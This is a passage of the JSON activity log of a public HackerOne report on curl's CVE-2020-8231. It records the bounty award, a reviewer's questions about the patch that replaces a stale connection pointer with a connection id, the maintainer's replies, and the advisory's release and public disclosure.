work!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-07T08:29:59.971Z","updated_at":"2020-08-07T08:29:59.971Z","actor":{"url":"/curl","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"curl"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"curl","collaborator":{"username":"m42a","url":"/m42a"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8912602,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've posted the advisory as a \"pre-notification\" to distros@openwall.org and Seth Arnold of Canonical raised this concern. I'll reply to him, then paste my reply here as well. That email list is closed for the public.\n\n----\n\nI gave the patch a very cursory read and came to the conclusion that \"the\nfix\" amounts to this hunk:\n\n~~~diff\n-  if(data-\u003estate.lastconnect) {\n+  if(data-\u003estate.lastconnect_id !=3D -1) {\n     /* Mark any connect-only connection for closure */\n     Curl_conncache_foreach(data, data-\u003estate.conn_cache,\n                            data, \u0026close_connect_only);\n+    data-\u003estate.lastconnect_id =3D -1;\n   }\n~~~\n\nThis appears to be the spot where NULLing a pointer may have been missing,\nis this correct?\n\nI have to admit some uncertainty with the approach -- if a pointer may\nhave been stale, I'm not sure why an integer hanging off the struct is\nmore likely to be correct.\n\nThis patch also changes the abi around the struct connfind objects; does\nthis object cross application boundaries? Will this change require\nrecompiled applications?\n\nThanks\n","markdown_message":"\u003cp\u003eI\u0026#39;ve posted the advisory as a \u0026quot;pre-notification\u0026quot; to \u003ca title=\"distros@openwall.org\" href=\"mailto:distros@openwall.org\" rel=\"nofollow noopener noreferrer\"\u003edistros@openwall.org\u003c/a\u003e and Seth Arnold of Canonical raised this concern. I\u0026#39;ll reply to him, then paste my reply here as well. That email list is closed for the public.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eI gave the patch a very cursory read and came to the conclusion that \u0026quot;the\u003cbr\u003e\nfix\u0026quot; amounts to this hunk:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gd\"\u003e-  if(data-\u0026gt;state.lastconnect) {\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+  if(data-\u0026gt;state.lastconnect_id !=3D -1) {\n\u003c/span\u003e     /* Mark any connect-only connection for closure */\n     Curl_conncache_foreach(data, data-\u0026gt;state.conn_cache,\n                            data, \u0026amp;close_connect_only);\n\u003cspan class=\"gi\"\u003e+    data-\u0026gt;state.lastconnect_id =3D -1;\n\u003c/span\u003e   }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis appears to be the spot where NULLing a pointer may have been missing,\u003cbr\u003e\nis this correct?\u003c/p\u003e\n\n\u003cp\u003eI have to admit some uncertainty with the approach -- if a pointer may\u003cbr\u003e\nhave been stale, I\u0026#39;m not sure why an integer hanging off the struct is\u003cbr\u003e\nmore likely to be correct.\u003c/p\u003e\n\n\u003cp\u003eThis patch also changes the abi around the struct connfind objects; does\u003cbr\u003e\nthis object cross application boundaries? Will this change require\u003cbr\u003e\nrecompiled applications?\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T06:24:48.050Z","updated_at":"2020-08-12T06:24:48.050Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8912671,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"(This is how I replied to Seth's email about his concerns)\n\n----\n\nThanks for checking out the patch!\n\n\u003e This appears to be the spot where NULLing a pointer may have been missing, is\n\u003e this correct?\n\nYes and no. Clearing the pointer there would not mitigate the full problem, as the\nAPI doesn't mandate that the user removes the easy handle from the multi handle\nwhen the connection is used and that assignment/clearing is in the\ncurl_multi_remove_handle() function.\n\n\u003e I have to admit some uncertainty with the approach -- if a pointer may have been\n\u003e stale, I'm not sure why an integer hanging off the struct is more likely to be\n\u003e correct.\n\nBecause the id is an incrementing integer so each new connection gets a new number\nand if one old 'lastconnect_id' would linger around using a number identifying a\nnow-closed connection, it can't be satisfied by a connection created later.\n\nI'm not married to this specific solution and would be happy to solve it otherwise\nif we can come up with a cleaner or nicer approach. This one should at least fix\nthe security issue for now.\n\n\u003e This patch also changes the abi around the struct connfind objects; does this\n\u003e object cross application boundaries? Will this change require recompiled\n\u003e applications?\n\nNothing of this change affects the ABI to the best of my knowledge. Applications\ndon't see the connfind object; it is private.","markdown_message":"\u003cp\u003e(This is how I replied to Seth\u0026#39;s email about his concerns)\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eThanks for checking out the patch!\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThis appears to be the spot where NULLing a pointer may have been missing, is\u003cbr\u003e\nthis correct?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eYes and no. Clearing the pointer there would not mitigate the full problem, as the\u003cbr\u003e\nAPI doesn\u0026#39;t mandate that the user removes the easy handle from the multi handle\u003cbr\u003e\nwhen the connection is used and that assignment/clearing is in the\u003cbr\u003e\ncurl_multi_remove_handle() function.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eI have to admit some uncertainty with the approach -- if a pointer may have been\u003cbr\u003e\nstale, I\u0026#39;m not sure why an integer hanging off the struct is more likely to be\u003cbr\u003e\ncorrect.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eBecause the id is an incrementing integer so each new connection gets a new number\u003cbr\u003e\nand if one old \u0026#39;lastconnect_id\u0026#39; would linger around using a number identifying a\u003cbr\u003e\nnow-closed connection, it can\u0026#39;t be satisfied by a connection created later.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m not married to this specific solution and would be happy to solve it otherwise\u003cbr\u003e\nif we can come up with a cleaner or nicer approach. This one should at least fix\u003cbr\u003e\nthe security issue for now.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThis patch also changes the abi around the struct connfind objects; does this\u003cbr\u003e\nobject cross application boundaries? Will this change require recompiled\u003cbr\u003e\napplications?\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eNothing of this change affects the ABI to the best of my knowledge. Applications\u003cbr\u003e\ndon\u0026#39;t see the connfind object; it is private.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T06:37:36.624Z","updated_at":"2020-08-12T06:37:36.624Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8975086,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Now released. The public URL for this vulnerability is here: https://curl.haxx.se/docs/CVE-2020-8231.html","markdown_message":"\u003cp\u003eNow released. The public URL for this vulnerability is here: \u003ca title=\"https://curl.haxx.se/docs/CVE-2020-8231.html\" href=\"/redirect?url=https%3A%2F%2Fcurl.haxx.se%2Fdocs%2FCVE-2020-8231.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://curl.haxx.se/docs/CVE-2020-8231.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-19T07:54:06.968Z","updated_at":"2020-08-19T07:54:06.968Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"m42a","url":"/m42a"},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9730760,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I think we can show the world this now without any risk.","markdown_message":"\u003cp\u003eI think we can show the world this now without any risk.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T08:31:12.455Z","updated_at":"2020-11-05T08:31:12.455Z","first_to_agree":true,"actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9732509,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-05T12:41:13.409Z","updated_at":"2020-11-05T12:41:13.409Z","actor":{"username":"m42a","cleared":false,"url":"/m42a","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9732510,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-05T12:41:13.474Z","updated_at":"2020-11-05T12:41:13.474Z","actor":{"username":"m42a","cleared":false,"url":"/m42a","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}